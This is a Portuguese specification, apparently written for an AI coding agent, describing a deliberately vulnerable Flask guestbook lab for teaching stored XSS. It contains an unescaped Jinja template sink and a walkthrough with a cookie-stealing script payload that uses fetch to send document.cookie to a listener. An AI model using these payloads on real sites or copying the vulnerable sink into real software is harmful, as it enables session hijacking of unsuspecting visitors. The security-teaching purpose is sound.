# Spec — Átomo 08: `xss-stored`

> Documento de especificação para o Claude Code implementar o oitavo átomo do projeto `atomicvulns` (Fase 2, terceiro átomo da fase). Leia junto com `CLAUDE.md` (Seções 3.3, 5, 8, 10.5), `ROADMAP.md`, e — obrigatoriamente — o átomo **irmão** `atoms/A03-injection/xss-reflected/` na íntegra (mesma classe, mesmo sink `|safe`, mesmo fix), além do átomo recém-fechado `atoms/A03-injection/sqli-blind-time/` como referência de **formato atualizado** (estrutura de README/WALKTHROUGH/DIFF, `docker-compose.yml`, `Dockerfile`, blocos de payload decoded/Burp-ready).
>
> Esta spec captura apenas as decisões *específicas* deste átomo — convenções estruturais (Theory primer, port scheme, banner, bilinguismo, etc.) ficam no `CLAUDE.md`. Onde o átomo 02 (`xss-reflected`) já resolveu uma questão (forma do sink `|safe`, forma do fix, nota sobre source→sink cross-file, aside de DOM-based XSS), a instrução aqui é **reusar a forma do 02**, não reinventar.

---

## Identidade

- **ID:** `xss-stored`
- **Categoria OWASP:** A03 — Injection
- **Pasta:** `atoms/A03-injection/xss-stored/`
- **Número sequencial:** 08
- **Porta vulnerable:** `127.0.0.1:8008`
- **Porta fixed:** `127.0.0.1:8108`
- **Theory primer:** [PortSwigger: Stored cross-site scripting (XSS)](https://portswigger.net/web-security/cross-site-scripting/stored) — página conceitual de introdução confirmada (H1 "Stored XSS"; abre com "Stored cross-site scripting (also known as second-order or persistent XSS) arises when an application receives data from an untrusted source and includes that data within its later HTTP responses in an unsafe way"). É a página "What is X?", **não** a listagem de labs. O texto do link usa **"Stored cross-site scripting (XSS)"** — forma paralela à do átomo 02 ("Reflected cross-site scripting (XSS)") e fiel à própria frase de abertura da PortSwigger. Nome preservado em inglês também no README PT (convenção v0.1.0). A página inteira usa o exemplo de **comentário de blog** — alinhado de propósito com a feature deste átomo (guestbook).

---

## Classe de vulnerabilidade

Stored (persistent) Cross-Site Scripting. Input não sanitizado é **persistido no servidor** (banco) e, mais tarde, **renderizado de volta sem escape** no HTML servido a **outros visitantes**. A causa raiz é idêntica à do reflected (átomo 02): output não escapado no sink — aqui, um template Jinja que marca o conteúdo do comentário como `|safe`, desligando o autoescape. O que muda **não é a causa nem o fix** — é a **forma de entrega**.

**Por que esta variante é didaticamente essencial — e o que ela ensina que o átomo 02 não ensina.** O reflected estabeleceu "string controlada pelo atacante vira JavaScript no sink HTML". Mas no reflected o payload vive numa única request-response do próprio atacante: ele injeta na query string e *ele mesmo* vê o `alert`. Isso esconde dois fatos que **definem** o stored:

1. **Persistência.** O payload é **salvo** e **sobrevive** à request que o injetou. No reflected ele vive só na query string de um request-response. Aqui ele fica no banco e é re-servido em **toda** request subsequente, **indefinidamente**, até alguém apagá-lo.

2. **Vítima de terceiros.** O sink **não está no caminho do atacante**. O atacante faz um `POST` (escreve o comentário malicioso) e vai embora — a resposta do *seu* POST é inerte. A execução acontece num `GET` que **outra pessoa** faz (a vítima abre a página de comentários). Atacante e vítima são **pessoas diferentes, em requests diferentes, em momentos diferentes**.

O segundo ponto muda o **modelo de impacto**, não só a mecânica: reflected exige **engenharia social** — a vítima precisa clicar num link preparado pelo atacante (o payload está *na URL*). Stored **não** — a vítima visita uma página legítima por conta própria, sem nenhum link suspeito, e é atingida. Por isso stored é, na prática, mais perigoso que reflected **mesmo com o mesmo fix**: sem a correção, o alcance é maior (toda vítima, persistente, sem isca).

### O par XSS (a ser explicitado no DIFF e no WALKTHROUGH)

Assim como a trilogia SQLi (01/06/07) é "uma causa raiz, três canais de exfil", o **par XSS** é "uma causa raiz, dois modelos de entrega":

| Átomo | Onde o payload vive | Quem dispara | Quando dispara | Precisa de isca? |
|---|---|---|---|---|
| 02 `xss-reflected` | na **query string** de uma request | o **próprio atacante** (ou a vítima que clicou no link dele) | na **mesma** request-response | **sim** (vítima clica no link) |
| 08 `xss-stored` | **persistido no banco** | **qualquer visitante** (terceiro) | em **toda** request futura ao `GET /` | **não** (vítima visita página legítima) |

A causa é idêntica nos dois (output não escapado / `|safe` no sink); o fix é idêntico nos dois (autoescape do Jinja — dropar o `|safe`). O que muda é só **a entrega** — e, por consequência, o **alcance**. Este átomo é o par natural do 02: o aluno que fez o reflected reconhece o sink `|safe` na hora e foca no que é novo (persistência + vítima de terceiros).

### Contraste explícito com o átomo 02 — é parte da aula

O DIFF e o WALKTHROUGH devem ancorar no contraste com o reflected (paralelo ao que a trilogia SQLi faz entre 01/06/07, todos publicados em `main`):

- No reflected, o payload **vai e volta na mesma request**, e **o atacante é quem vê o `alert`**. Aqui, o atacante **planta e sai**; a **vítima dispara**.
- No reflected, a prova do bug é "meu input voltou na *minha* resposta". Aqui, a prova é "meu input voltou na resposta de **outra pessoa**, numa request que **eu não fiz**".

---

## Feature simulada

**Guestbook (mural de recados).**

Uma página pública onde qualquer visitante deixa um recado (nome + comentário). A página mostra todos os recados já deixados, do mais novo para o mais antigo, e tem um formulário no topo para postar um novo. É o tipo de feature trivial que existe em incontáveis sites reais (livro de visitas, mural, seção de comentários) — do ponto de vista do usuário legítimo, ele escreve "adorei o site!" e o recado aparece na lista para os próximos visitantes lerem.

**Decisão: guestbook standalone, não comentários de um "post" fake.** O guestbook é o mínimo absoluto que carrega a lição: uma página, uma lista, um formulário. Um "post" fake adicionaria um segundo conceito (o conteúdo do post) irrelevante ao bug e gastaria HTML à toa (princípio de minimalismo do projeto, CLAUDE.md §3.3). A própria PortSwigger usa o exemplo de comentário de blog na página de teoria; o guestbook captura a mesma mecânica (conteúdo de usuário persistido e re-servido a outros visitantes) com menos andaime.

**Dois endpoints + persistência (a mudança estrutural em relação ao reflected, que tinha só um endpoint que ecoava):**

- **`GET /`** — exibe **todos** os comentários já salvos (este é o **SINK**: os comentários são renderizados de volta sem escape) **+** o formulário para postar. Este endpoint **também SETA o cookie de sessão fake** (ver seção "Cookie de sessão fake").
- **`POST /comment`** — salva um comentário novo no banco e **redireciona** de volta pra `GET /` (padrão Post/Redirect/Get).

O atacante posta um comentário com payload via `POST /comment`. Qualquer visitante que abrir `GET /` depois disso executa o payload no próprio browser.

**Tipo de átomo:** **com HTML** — e aqui o HTML **não é só contexto**: o browser é **obrigatório** para observar a execução (ver "Divisão Burp vs browser"). Um único `templates/index.html` (lista + formulário na mesma página, graças ao Post/Redirect/Get) — ainda mais enxuto que o reflected, que tinha dois templates.

---

## Schema de dados

Uma única tabela, `comments`. **Não há tabela `users`/`secrets`** (ao contrário dos átomos SQLi) — e essa ausência é didática: em stored XSS o "loot" **não está no banco**. O alvo roubado é o **cookie de sessão da vítima** (ver próxima seção), que vive no browser dela, não no servidor. É o contraste limpo SQLi × XSS: SQLi exfiltra **dado server-side**; XSS sequestra a **sessão client-side**.

```sql
CREATE TABLE comments (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    author TEXT NOT NULL,
    body TEXT NOT NULL,
    created_at TEXT NOT NULL DEFAULT (date('now'))
);

-- 2 recados benignos pré-existentes: a página não nasce vazia, parece um
-- guestbook real, e o comentário malicioso do atacante aparece no MEIO de
-- conteúdo legítimo (mais realista — a vítima vê um mural normal).
INSERT INTO comments (author, body, created_at) VALUES
    ('alice', 'Love this little guestbook. Clean and simple!',     '2026-06-21'),
    ('bob',   'Greetings from the sysadmin team. Nice work here.', '2026-06-23');
```

**Campos:** `(id, author, body, created_at)` — confirmado conforme proposta do mantenedor.

- **`body` carrega o payload** no walkthrough. É o campo "comentário", o lugar óbvio e natural.
- **`author` é renderizado escapado** (plain `{{ comment.author }}`) em **ambas** as versões — **não** é um sink. Decisão deliberada: manter **exatamente um sink** (o `body`) e, portanto, **exatamente uma linha de fix**, espelhando o reflected (`{{ q|safe }}` → `{{ q }}`). Um guestbook real talvez fosse vulnerável nos dois campos; para minimalismo didático, concentramos o único sink no `body`. **Não** colocar `|safe` no `author`.
- **`created_at`** é metadado gerado pela app, **exibido na lista** como timestamp discreto e **escapado** (nunca sink). Coluna com `DEFAULT (date('now'))`; o `POST /comment` insere só `(author, body)` e o timestamp se preenche sozinho com a data de hoje. O **seed traz datas explícitas no passado** (`2026-06-21`, `2026-06-23`) para o guestbook nascer com histórico visível — o que reforça a persistência (Step 2): timestamps distintos tornam tangível que os recados ficaram salvos ao longo do tempo, e o recado plantado pelo atacante aparece com a data de hoje, destacado dos antigos.

**Seed:** 2 recados benignos (de `alice` e `bob` — nomes recorrentes no repo, dão continuidade). O atacante do walkthrough planta como um terceiro nome, **`mallory`** (nome clássico de atacante), distinto de alice/bob: reforça o modelo "o atacante não é a vítima". Dados óbvios e fake; sem segredos reais.

---

## Rotas

> **Ponto central, a cravar:** `vulnerable/app.py` e `fixed/app.py` são **idênticos byte a byte**. O bug vive **inteiramente no template** — exatamente como no átomo 02 (cujo `DIFF.md` diz "The app.py files are identical in both versions — the bug lives entirely in the template"). Toda a diferença vulnerable × fixed é a única linha do `|safe`. Isto é uma propriedade deliberada do par XSS, não coincidência.

Imports necessários: `from flask import Flask, request, render_template, make_response, redirect, url_for`.

### `GET /`

Lista os comentários (sink no template) e **seta o cookie de sessão fake**.

```python
@app.route("/")
def index():
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    comments = conn.execute(
        "SELECT author, body, created_at FROM comments ORDER BY id DESC"
    ).fetchall()
    conn.close()
    resp = make_response(render_template("index.html", comments=comments))
    # Fake session cookie — gives the cookie-theft payload something concrete to steal.
    # Deliberately NOT HttpOnly so document.cookie can read it (the demo would be empty otherwise).
    resp.set_cookie("session", "fake-session-token-abc123")
    return resp
```

- `row_factory = sqlite3.Row` → o template usa acesso por nome (`comment.author`, `comment.body`), legível como o `post.title` do reflected.
- `ORDER BY id DESC` → o comentário recém-plantado aparece no **topo** da lista (fácil de localizar no walkthrough). A posição não afeta a execução do `<script>`.
- `make_response(...)` + `set_cookie(...)` é o que permite anexar o cookie a uma resposta que renderiza template.

### `POST /comment`

Salva o comentário e redireciona (Post/Redirect/Get).

```python
@app.route("/comment", methods=["POST"])
def comment():
    author = request.form.get("author", "")
    body = request.form.get("body", "")
    conn = sqlite3.connect(DB_PATH)
    # Parameterized insert: storing the payload is NOT the bug (no SQLi here).
    # The bug is rendering it unescaped on the way OUT (see templates/index.html).
    conn.execute("INSERT INTO comments (author, body) VALUES (?, ?)", (author, body))
    conn.commit()
    conn.close()
    return redirect(url_for("index"))
```

> **Crítico — o INSERT é parametrizado de propósito.** Guardar o payload **não é** a vulnerabilidade; não há SQL injection aqui. Se o INSERT concatenasse input, o átomo ganharia um segundo bug (SQLi) e violaria "um átomo = uma vulnerabilidade" (CLAUDE.md §2). O dado é **armazenado com segurança** (placeholder `?`); o único bug é a **renderização sem escape na saída**. O walkthrough deve frisar: "o stored XSS entra limpo no banco — o problema é como ele *sai*."

### `init_db()`

Mesmo padrão do átomo 07: cria a tabela se o arquivo não existir e insere o seed. Sem volume mount (ver "Notas") — os comentários plantados vivem enquanto o container roda; `./atom down` + `up` reseta ao seed.

```python
def init_db():
    if os.path.exists(DB_PATH):
        return
    conn = sqlite3.connect(DB_PATH)
    conn.executescript(
        """
        CREATE TABLE comments ( ... );  -- ver Schema acima
        INSERT INTO comments (author, body, created_at) VALUES ( ... );
        """
    )
    conn.commit()
    conn.close()
```

`if __name__ == "__main__": init_db(); app.run(host=os.environ.get("HOST", "127.0.0.1"), port=5000)` — idêntico ao 07.

---

## O sink — mecanismo exato (`| safe`) e por que não os outros candidatos

O Jinja **autoescapa por padrão**: `{{ comment.body }}` converteria `<`, `>`, `&`, `'`, `"` em entidades HTML antes de chegar à resposta, e o `<script>` viraria texto literal inofensivo. Para o stored XSS existir, a versão vulnerable precisa **deliberadamente desligar** esse escape no sink.

**Mecanismo escolhido: filtro `| safe` na expressão do `body`, dentro do loop do template.**

```jinja
{% for comment in comments %}
<li><strong>{{ comment.author }}</strong> &middot; {{ comment.created_at }} &mdash; {{ comment.body|safe }}</li>
{% endfor %}
```

**Por que `| safe` e não os outros candidatos:**

- **`| safe` (escolhido).** É **exatamente o mesmo sink do átomo 02** (`{{ q|safe }}`). Isso torna o par XSS afiado: mesma classe, mesma primitiva de sink, mesmo fix (dropar o `|safe`). O `DIFF.md` vira um eco quase perfeito do DIFF do reflected — que é precisamente a âncora pedagógica que se quer. Mantém viva a lição de auditoria do 02: `grep -rn '|safe' templates/` é o first-pass barato e de alto sinal. E preserva o source→sink cruzando arquivos (source no `POST` que salvou; sink no `GET` que renderiza) — aqui ainda mais forte: cruza **arquivos E requests E pessoas**.
- **`autoescape=False` (rejeitado).** Desligaria o escape do bloco/template inteiro — mais amplo, menos cirúrgico, e diverge do idioma `|safe` já estabelecido no 02. O fix deixaria de ser uma linha.
- **`render_template_string(...)` com a string de comentários montada à mão (rejeitado, e por um motivo forte).** Passar conteúdo controlado pelo usuário a `render_template_string` introduz **server-side template injection** — uma **classe de vulnerabilidade distinta** (o atacante injetaria sintaxe de template Jinja, não só HTML). Isso violaria "um átomo = uma vulnerabilidade" e contaminaria a aula de XSS com SSTI. Descartado por princípio. (Quem quiser SSTI tem a página da PortSwigger; não é este átomo.)

**Fix = a contrapartida limpa:** dropar o `|safe`, restaurando o autoescape padrão do Jinja. O `<script>` armazenado vira texto literal **visível** na tela (`&lt;script&gt;...&lt;/script&gt;`), não executável.

```diff
-<li><strong>{{ comment.author }}</strong> &middot; {{ comment.created_at }} &mdash; {{ comment.body|safe }}</li>
+<li><strong>{{ comment.author }}</strong> &middot; {{ comment.created_at }} &mdash; {{ comment.body }}</li>
```

---

## Cookie de sessão fake — tornar o roubo tangível

No `GET /`, a app seta um cookie de sessão fake (ver código da rota acima):

```python
resp.set_cookie("session", "fake-session-token-abc123")
```

Mesmo princípio do `wonderland` nos átomos SQLi: um **alvo concreto plantado pela própria app**, para que o roubo seja tangível em vez de abstrato. Sem ele, o payload de exfiltração do Step 3 leria `document.cookie` vazio e o aluno não veria nada chegar no listener.

Regras inegociáveis deste cookie:

1. **Não autentica nada de verdade** — é um lab. É só um valor concreto para o `document.cookie` ter o que roubar.
2. **NÃO pode ser HttpOnly.** Se fosse, `document.cookie` não o enxergaria e o roubo não demonstraria nada. O `set_cookie` do Flask já é `httponly=False` por padrão; mantemos o padrão e documentamos o porquê num comentário curto (não escrever `httponly=False` explícito — o comentário basta e mantém a linha limpa).
3. **Presente em AMBAS as versões (vulnerable e fixed), idêntico.** O cookie **não é a vulnerabilidade**; o sink sem escape é. Na versão fixed o cookie continua sendo setado, mas o payload não executa (escape), então não há roubo. Isto preserva a propriedade "app.py idêntico nas duas versões".

**Detalhe técnico a notar (para o validador não se confundir):** o cookie existe **já na primeira visita**. Numa resposta HTTP, os headers (incluindo `Set-Cookie`) chegam **antes** do body. O browser aplica o `Set-Cookie` ao cookie jar e só então parseia o body e executa o `<script>` inline — então `document.cookie` **já contém** `session=fake-session-token-abc123` quando o script roda, mesmo no primeiro `GET /`. Não é preciso "visitar duas vezes".

**Escopo do cookie:** `set_cookie` sem `domain` → cookie host-only para `127.0.0.1`. Cookies são por **host**, não por porta — então `document.cookie` na página servida de `127.0.0.1:8008` enxerga o cookie normalmente.

---

## HTML

Um único template, `templates/index.html`, **idêntico nas pastas `vulnerable/` e `fixed/` exceto pelo `|safe`**. ≤40 linhas, CSS ≤5 linhas inline, sem JS, sem framework. Reaproveitar o esqueleto dos átomos 02/07.

Esboço (versão vulnerable; a fixed só troca `{{ comment.body|safe }}` por `{{ comment.body }}`):

```html
<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Guestbook</title>
<style>body{font-family:sans-serif;max-width:720px;margin:2em auto;padding:0 1em;}ul{padding-left:1em;}</style>
</head>
<body>
<p><strong>&#9888; Intentionally vulnerable. Run locally only.</strong></p>
<h1>Guestbook</h1>
<form method="post" action="/comment">
  <label>Name: <input type="text" name="author"></label>
  <label>Comment: <input type="text" name="body" autofocus></label>
  <button type="submit">Sign</button>
</form>
<ul>
  {% for comment in comments %}
  <li><strong>{{ comment.author }}</strong> &middot; {{ comment.created_at }} &mdash; {{ comment.body|safe }}</li>
  {% endfor %}
</ul>
<p><em>Open with Burp proxy enabled, interact once, then work from Burp Repeater.</em></p>
</body>
</html>
```

- Banner de aviso obrigatório no topo (igual aos demais átomos).
- `<form method="post" action="/comment">` com dois campos (`author`, `body`) e botão `Sign` — dispara a feature (postar recado).
- Lista de comentários (o sink no `body`).
- Rodapé padrão com a dica do Burp.
- **`author` escapado, `body` com `|safe`** (o único sink). **`created_at` é exibido** na lista como timestamp discreto e **escapado** (nunca sink) — formato `author &middot; created_at &mdash; body`. Cabe folgado em ≤40 linhas (o esboço segue em ~24 linhas).

---

## Fix

Diff esperado entre `vulnerable/templates/index.html` e `fixed/templates/index.html` (mesma forma do átomo 02):

```diff
-<li><strong>{{ comment.author }}</strong> &middot; {{ comment.created_at }} &mdash; {{ comment.body|safe }}</li>
+<li><strong>{{ comment.author }}</strong> &middot; {{ comment.created_at }} &mdash; {{ comment.body }}</li>
```

O `app.py` é **idêntico** nas duas versões — o bug vive inteiramente no template.

### Notas obrigatórias no DIFF.md

1. **Mesmo fix do reflected, reformulado (não copiado).** Dropar o `|safe` reativa o autoescape do Jinja; todo caractere que poderia deslocar o parser HTML (`<`, `>`, `&`, `'`, `"`) vira entidade no momento do render. O `<script>alert(...)</script>` armazenado chega ao browser como `&lt;script&gt;...&lt;/script&gt;` — texto visível, não markup. Referenciar `xss-reflected` explicitamente (publicado em `main`): mesmo sink, mesma defesa, mesma classe.

2. **Mesmo fix, blast radius maior (o que diferencia stored de reflected).** Enfatizar: stored **não** é "um reflected pior por acaso" — é o **mesmo bug** (output não escapado) com **entrega diferente** (persistido, terceiros). O fix é o mesmo *porque a causa raiz é a mesma*. Mas, **sem** o fix, o impacto do stored é estritamente pior: persistente, atinge **toda** vítima que abrir a página, e **dispensa engenharia social** (no reflected a vítima precisa clicar no link do atacante; aqui ela só visita uma página legítima). Paralelo à moldura "uma causa raiz, N exploits" da trilogia SQLi — aqui "uma causa raiz, dois modelos de entrega".

3. **HttpOnly como defesa-em-profundidade ADICIONAL (não o fix principal).** Setar o cookie de sessão como `HttpOnly` faria `document.cookie` **não** enxergá-lo, neutralizando **especificamente o payload de roubo de cookie** — mesmo que o XSS continuasse existindo. Mas **HttpOnly NÃO é o fix** e **não para o XSS**: com o sink ainda aberto, o atacante continua podendo desfigurar a página, fazer requests autenticadas no contexto da vítima, capturar teclas, ler o DOM, etc. O fix de verdade é **escapar o output**. HttpOnly é uma **segunda camada** valiosa que **limita o estrago** se um XSS escapar — defense-in-depth, não correção. Explicar por que a versão **fixed não adiciona HttpOnly**: queremos **exatamente uma variável** mudando entre vulnerable e fixed (o escape), para a lição ficar inequívoca; empilhar HttpOnly aqui borraria "qual mudança fecha o XSS".

---

## Divisão Burp vs browser — e por que é correto ser diferente dos átomos 06/07

Os átomos 06 e 07 foram **Burp-only** porque SQLi se observa em request/response. **XSS é diferente: o Burp não executa JavaScript.** A execução do payload só é visível num **browser** renderizando o `GET /`. Então o átomo **não** é Burp-only — o browser é **obrigatório** para observar.

A divisão dos papéis **não é arbitrária — ela espelha o modelo de ataque** (atacante e vítima são partes diferentes, em requests diferentes). Esse é o detalhe elegante a explorar no walkthrough:

- **PLANTIO (atacante) → via Burp.** Interceptar/repetir o `POST /comment` com o payload cru no corpo, no Repeater. É a parte que ensina a **profissão** (controlar o payload byte a byte, encoding, Repeater) — por isso é a **trilha principal**, cumprindo a regra "Burp é principal" do CLAUDE.md §3.3.
- **EXECUÇÃO / observação (vítima) → via BROWSER.** Abrir `GET /` num browser comum, **como um visitante qualquer**. O `alert` dispara no browser; a exfiltração do cookie aparece na saída do listener. Esta metade é **intrínseca à classe**, não um "primeiro passo de baixa fricção opcional".

**Reconciliação com o CLAUDE.md §3.3 (Burp principal / browser secundário opcional).** Aqui a trilha **principal** legitimamente usa **Burp (plantar) + browser (observar)**, porque a classe exige as duas ferramentas para uma narrativa só. A **trilha secundária opcional** (no sentido do CLAUDE.md — a versão sem Burp, baixa fricção) existe e é: **plantar pelo próprio formulário do guestbook no browser** e recarregar para ver disparar. Mapeia limpo:

- **Trilha principal (Burp + browser):** planta o payload cru no Repeater (`POST /comment`), depois vira a vítima no browser (`GET /`). Ensina o workflow pro **e** o split atacante/vítima.
- **Trilha secundária (browser-only, opcional):** para quem ainda não configurou o Burp — digita o payload direto no formulário, submete, recarrega. O browser encoda o body automaticamente. Primeira experiência de "sentir o impacto".

**Não tentar fazer este átomo Burp-only.** Um `POST` e um `GET` no Burp não mostram o XSS executando.

---

## Walkthrough — payloads

Três passos. A escalada foregrounda os dois conceitos novos (persistência, vítima de terceiros) por cima do "ele executa": **plantar uma vez e ver disparar em OUTRA request (split atacante/vítima)** → **provar a persistência (dispara pra todo visitante, sempre)** → **impacto real (roubar o cookie da vítima para um listener)**.

> **Sem passo de filtro/bypass.** O sink é um `|safe` puro (sem filtro), igual ao reflected — o átomo ensina o **conceito stored** limpo (persistência + terceiros), não evasão de filtro. Adicionar um filtro contradiria o sink limpo e diluiria o foco em uma segunda lição. (Bypass de filtro é território de átomo futuro / PortSwigger.)

**Estrutura dos blocos por payload (reusar do 06/07):** quando o payload vai no corpo de um `POST` (form-urlencoded), mostrar **Body (decoded)** (para leitura) **+ Body (Burp-ready)** (colável, com os caracteres encodados). Reusar a convenção, não reinventar.

**Nota de encoding do corpo (form-urlencoded) — específica do Burp, importante:** ao montar o corpo à mão no Repeater, caracteres significativos para `application/x-www-form-urlencoded` precisam de encode no **valor** do campo: `&` (`%26`, separa campos), `=` (`%3D`), e **`+` (`%2B`) — atenção: um `+` literal no corpo é decodado como ESPAÇO pelo parser de form do Flask**. Caracteres comuns de payload XSS (`<`, `>`, `'`, `"`, `/`) também devem ser encodados no valor. O atalho seguro é o mesmo do 02/06: colar o valor decoded no Repeater, selecioná-lo e apertar **Ctrl+U** (Burp encoda tudo, inclusive o `+`→`%2B`). **Pelo formulário do browser (trilha secundária), o encoding é automático** — a armadilha do `+` só morde quem monta o corpo cru no Burp.

### Step 1 — Plantar uma vez, disparar em outro lugar (o loop stored)

**1a — plantar (atacante, Burp).** `POST /comment` com o payload de prova no `body` e um nome qualquer no `author`.

- **Body (decoded):** `author=mallory&body=<script>alert(document.domain)</script>`
- **Body (Burp-ready):** o `author` é trivial; no `body`, encodar `<`/`>`/`/` (e qualquer char significativo) — ou colar decoded e **Ctrl+U** sobre o valor de `body`. (Este payload não tem `+`/`&`/`=`, então é simples; o `+` aparece no Step 3.)
- **Resposta esperada:** um **302 redirect** para `/`. **Observação-chave:** a resposta do *atacante* é **inerte** — **nenhum `alert`, nada executa**. O payload **não voltou** na resposta do POST. Ele foi para o **armazenamento**. (Primeiro contraste com o reflected: lá a resposta do atacante *carregaria e executaria* o payload; aqui ela é inócua.)

**1b — disparar (vítima, browser).** Abrir `GET /` num browser comum — "você agora é um visitante qualquer, que **nunca viu** a request do atacante".

- **Resposta esperada:** o **`alert` dispara**, mostrando `127.0.0.1:8008`. O script que o atacante **armazenou** roda **no SEU browser**, numa request que **VOCÊ** fez, num momento que **VOCÊ** escolheu — o atacante já foi embora.
- **A lição central:** este é o coração do stored — atacante e vítima são **partes diferentes, em requests diferentes, em momentos diferentes**. A divisão de ferramentas (Burp planta, browser dispara) **espelha** essa divisão de papéis.
- **Paralelo com o 02:** mesmo payload do Step 3 do reflected (`<script>alert(document.domain)</script>`), agora **armazenado** em vez de **refletido** — o contraste mais limpo possível: *mesmo payload, entrega diferente*.
- **Aside (por que `<script>` inline funciona aqui):** o servidor injeta o `<script>` no **HTML inicial** do `GET /`, que o browser parseia top-to-bottom no load — script tags inline encontrados nesse parse sempre executam. Em DOM-based XSS — onde o sink está em JavaScript client-side que escreve input no DOM **depois** do load — o browser deliberadamente **não** executa script tags inseridos via `innerHTML` pós-load, e este mesmo payload falharia. A classe é a mesma; o sink é diferente; o payload tem que casar com o sink. (Generalizar a lição; **não** nomear átomo futuro. Linkar PortSwigger se aprofundar.)

### Step 2 — Provar a persistência (dispara pra todo visitante, sempre)

Sem postar nada novo, **recarregar** `GET /` — ou abrir numa **segunda aba / outro profile de browser** (simulando uma vítima genuinamente diferente).

- **Resposta esperada:** o `alert` dispara **de novo**, sem reenviar nada.
- **O ponto stored + o contraste "o que a vuln NÃO é":** o payload **não foi echo** de um parâmetro da request — repare que a URL do `GET /` está **limpa, sem query string nenhuma**, e mesmo assim dispara. Não é reflection (não há nada na request para refletir). Está vindo do **banco**, em **toda** visita, para **todo** visitante, **indefinidamente**, até alguém apagar. Isto isola a causa real: a execução **não está atrelada à request do atacante nem a nenhum parâmetro** — é persistência pura no servidor atingindo cada leitor. (É o análogo, para esta classe, do passo de contraste do `idor-numeric-id`: provar que o disparo não depende de o atacante estar presente nem de a URL carregar algo malicioso.)

### Step 3 — Impacto real: roubar o cookie da vítima para um listener

> **Antes do passo — subir o listener.** Num terminal separado:
> ```bash
> python3 -m http.server 9000
> ```
> Isto é uma **técnica de pentest reutilizável**, não um truque de lab: subir um servidor HTTP de uma linha para capturar callbacks/exfiltração é padrão em engagements reais (XSS, SSRF, LFI, blind injection com canal out-of-band). Vale uma frase reconhecendo isso. (Se a 9000 estiver ocupada, qualquer porta livre.)

**Plantar o payload de exfiltração (atacante, Burp):** `POST /comment` com o payload de roubo de cookie no `body`.

- **Body (decoded):** `author=mallory&body=<script>fetch('http://127.0.0.1:9000/?c='+document.cookie)</script>`
- **Body (Burp-ready):** **aqui o encoding importa de verdade** — o `+` de `'+document.cookie` precisa virar `%2B` (senão o Flask o decoda como espaço e o JS quebra: `fetch('...?c=' document.cookie)` é erro de sintaxe), o `=` interno e os `<`/`>`/`'`/`/` também encodados. O caminho seguro: colar o `body` decoded e **Ctrl+U** sobre o valor.

**Disparar (vítima, browser):** com o listener no ar, abrir `GET /`.

- **Resposta esperada:** o browser da vítima, ao carregar o guestbook legítimo, **silenciosamente dispara o `fetch`**; no terminal do listener aparece uma linha de log tipo:
  ```
  127.0.0.1 - - [..] "GET /?c=session=fake-session-token-abc123 HTTP/1.1" 200 -
  ```
  O aluno **vê** o cookie de sessão da vítima chegando no listener do atacante.
- **Enquadramento:** isto roda **no browser da VÍTIMA, não no seu**. No mundo real o host seria o servidor do atacante (`//attacker.com`); no lab é `127.0.0.1:9000` (local, auto-contido). O atacante então **replaya** esse cookie para sequestrar a sessão da vítima. Manter didático, não apocalíptico (vale a nota do átomo 02 sobre payloads proporcionais — demonstrativos, não armamento).
- **Nota técnica (CORS não atrapalha a exfil):** o `fetch` cross-origin (de `127.0.0.1:8008` para `:9000`) pode ter sua **resposta** bloqueada por CORS — mas a **request sai assim mesmo**, carregando o dado roubado na query string, e **chega ao listener**. Exfiltração-via-URL funciona independente de CORS porque não dependemos de ler a resposta, só de a request partir. Boa lição de pentest, vale uma frase.
- **Nota de Mixed Content:** a app é **http puro** (Flask dev server, sem TLS, padrão do projeto), então o `fetch` para `http://127.0.0.1:9000` **não** é bloqueado por Mixed Content (que só bloquearia http a partir de página https). Confirmar que a app roda em http — se algum dia virar https, o Step 3 quebra.
- **Acúmulo (nota operacional):** por persistência, o `alert` do Step 1 **continua armazenado** e também dispara nesta visita — é esperado (e, de novo, demonstra persistência). Se quiser página limpa entre passos, `./atom down xss-stored && ./atom up xss-stored` reseta ao seed.

### Why this is stored (and not reflected) — explicit contrast (fecha o walkthrough)

Parágrafo final amarrando o par XSS (referenciando o `xss-reflected`, publicado em `main`). Sugestão de conteúdo:

> No `xss-reflected`, o payload ia e voltava na **mesma** request, e **o atacante** via o `alert` — a vítima só seria atingida se clicasse num **link** preparado pelo atacante (engenharia social). Aqui o atacante **plantou e saiu**; o payload ficou no **banco**, e **toda vítima** que abre o guestbook legítimo — sem clicar em link nenhum — executa o script, **persistentemente**. Mesmo sink (`|safe`), mesmo fix (autoescape), mesma classe — só a **entrega** mudou: de um eco efêmero na sua própria resposta para um payload persistente na resposta de **todo mundo**. E, com o cookie roubado, o que se exfiltra não é dado do servidor (como no SQLi) — é a **sessão da vítima**, do browser dela.

---

## Dependências extras

```
Flask==3.0.0
```

Idêntico aos átomos 02/06/07. `sqlite3` é stdlib. **Nada** mais — sem bcrypt, sem `requests`, sem JWT, sem framework de front-end. O listener do Step 3 é `python3 -m http.server` (stdlib, rodado pelo **aluno**, não é dependência do átomo).

---

## Decisões já tomadas, justificadas

| Decisão | Escolha | Justificativa |
|---|---|---|
| Feature | **Guestbook standalone** (não comentários de post fake) | Mínimo absoluto que carrega a lição (1 página, 1 lista, 1 form). Post fake adicionaria conceito irrelevante. Espelha o exemplo de comentário da PortSwigger com menos andaime. |
| Endpoints | `GET /` (lista + form + seta cookie) e `POST /comment` (salva + redirect) | Stored exige persistência + dois caminhos: escrever (POST) e ler (GET). Post/Redirect/Get permite um único template. |
| Stack de persistência | **SQLite**, tabela `comments` | Mantém o paralelismo de stack com SQLi/reflected; o aluno já conhece. |
| Mecanismo do sink | **`{{ comment.body\|safe }}`** | Mesmo sink do átomo 02 → par XSS afiado, fix de uma linha, lição `grep '\|safe'` reforçada. `autoescape=False` é amplo demais; `render_template_string` introduziria **SSTI** (segundo bug). |
| Campo do payload | **`body`** (author renderizado escapado, **não** é sink) | Exatamente **um** sink → **uma** linha de fix, espelhando o reflected. Não pôr `\|safe` no `author`. |
| Schema | `(id, author, body, created_at)`, INSERT **parametrizado** | created_at via `DEFAULT (date('now'))`, **exibido na lista** (escapado, nunca sink); seed com datas passadas explícitas (histórico visível reforça persistência). INSERT com `?` de propósito: armazenar não é o bug, **não há SQLi** — o bug é a saída sem escape. |
| Seed | **2 recados benignos** (`alice`, `bob`); atacante planta como **`mallory`** | Página não nasce vazia, parece real, payload aparece no meio de conteúdo legítimo. mallory ≠ vítima reforça o split de terceiros. |
